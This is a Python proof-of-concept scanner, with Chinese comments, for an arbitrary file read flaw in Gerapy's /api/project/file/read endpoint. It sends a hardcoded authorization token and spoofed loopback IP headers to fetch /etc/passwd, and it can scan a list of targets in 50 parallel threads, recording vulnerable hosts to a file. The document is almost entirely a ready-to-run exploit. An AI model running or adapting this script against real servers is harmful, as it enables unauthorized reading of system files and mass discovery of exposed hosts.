# Gerapy read 后台任意文件读取漏洞
import argparse,sys,requests,requests_raw
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()

#定义横幅
def banner():
    banner = """
██╗    ██╗ █████╗ ████████╗███████╗██████╗ ███╗   ███╗███████╗██╗      ██████╗ ███╗   ██╗
██║    ██║██╔══██╗╚══██╔══╝██╔════╝██╔══██╗████╗ ████║██╔════╝██║     ██╔═══██╗████╗  ██║
██║ █╗ ██║███████║   ██║   █████╗  ██████╔╝██╔████╔██║█████╗  ██║     ██║   ██║██╔██╗ ██║
██║███╗██║██╔══██║   ██║   ██╔══╝  ██╔══██╗██║╚██╔╝██║██╔══╝  ██║     ██║   ██║██║╚██╗██║
╚███╔███╔╝██║  ██║   ██║   ███████╗██║  ██║██║ ╚═╝ ██║███████╗███████╗╚██████╔╝██║ ╚████║
 ╚══╝╚══╝ ╚═╝  ╚═╝   ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝╚══════╝╚══════╝ ╚═════╝ ╚═╝  ╚═══╝                                                                                      
                                                version:Gerapy read 后台任意文件读取漏洞
                                                
"""
    print(banner)


#定义主函数
def main():
    #调用横幅
    banner()
    #argparse模块处理命令行参数
    parser = argparse.ArgumentParser(description="Gerapy read 后台任意文件读取漏洞")
    parser.add_argument('-u','--url',dest='url',type=str,help='input url')
    parser.add_argument('-f','--file',dest='file',type=str,help='input file path')
    args = parser.parse_args()
    #如果用户输入url而不是file时：
    if args.url and not args.file:
        poc(args.url)
    #如果用户输入file而不是url时：
    elif args.file and not args.url:
        url_list=[]
        with open(args.file,mode='r',encoding='utf-8') as fr:
            for i in fr.readlines():
                url_list.append(i.strip().replace('\n',''))
                # print(url_list)    
                #设置多线程 
        mp = Pool(50)
        mp.map(poc,url_list)
        mp.close()
        mp.join()
    #如果用户输入的既不是url也不是file时：
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
             
#定义poc
def poc(target):
    payload = "/api/project/file/read"
    url = target+payload
    headers = {
        'Content-Length':'35',
        'Accept':'application/json, text/plain',
        'Authorization':'Token 0fb31a60728efd8e6398349bea36fa7629bd8df0',
        'User-Agent':'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/96.0.4664.55 Safari/537.36',
        'Content-Type':'application/json;charset=UTF-8',
        'Accept-Encoding':'gzip, deflate',
        'Accept-Language':'zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6',
        'x-forwarded-for':'127.0.0.1',
        'x-originating-ip':'127.0.0.1',
        'x-remote-ip':'127.0.0.1',
        'x-remote-addr':'127.0.0.1',
        'Connection':'close', 
         }
    data ='''
{
"path":"/etc/",
"label":"passwd"
}
'''

    proxies = {
        'http':'http://127.0.0.1:8080',
        'https':'http://127.0.0.1:8080'
    }
    
    #请求网页
    # print(payload)
    re = requests.post(url=url,headers=headers,data=data,verify=False,proxies=proxies)
    # print(re.text)
    try:
        if re.status_code == 200 and 'root' in re.text:
            print(f'[+++]该{target}存在Gerapy read 后台任意文件读取漏洞')
            with open('result.txt',mode='a',encoding='utf-8')as ft:
                ft.write(target+'\n')
        else:
            print(f'该{target}不存在该漏洞')
    except:
        print(f'该{target}存在问题，请手动测试')


if __name__ == '__main__':
    main()